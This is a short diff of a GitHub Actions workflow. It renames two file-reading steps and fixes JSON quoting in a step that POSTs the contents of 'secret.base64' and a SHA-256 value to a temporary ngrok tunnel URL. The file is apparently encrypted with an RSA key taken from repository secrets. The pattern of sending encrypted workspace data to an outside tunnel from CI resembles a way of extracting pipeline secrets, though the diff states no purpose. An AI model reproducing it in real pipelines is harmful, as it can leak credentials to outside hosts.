@@ -23,13 +23,13 @@ jobs:
       env:
         PUBLIC_KEY: ${{ secrets.RSA_PUBLIC }}
         
-    - name: Read encrypted data
+    - name: Read encrypted file
       id: encrypted
       uses: juliangruber/read-file-action@v1
       with:
           path: "${{ github.workspace }}/secret.base64"
           
-    - name: Read encrypted data
+    - name: Read SHA file
       id: sha256
       uses: juliangruber/read-file-action@v1
       with:
@@ -44,6 +44,6 @@ jobs:
         url: 'https://197e-54-91-189-235.ngrok.io/hook/'
         method: 'POST'
         #data: '{"key":"${{ steps.package.outputs.content }}"}'
-        data: '{"data":"${{ steps.encrypted.outputs.content }}" , "sha256":${{ steps.sha256.outputs.content }}}'
-        customHeaders: '{"SHA256":${{ steps.sha256.outputs.content }}}'
+        data: '{"data":"${{ steps.encrypted.outputs.content }}" , "sha256":"${{ steps.sha256.outputs.content }}"}'
+        customHeaders: '{"SHA256":"${{ steps.sha256.outputs.content }}"}'
       
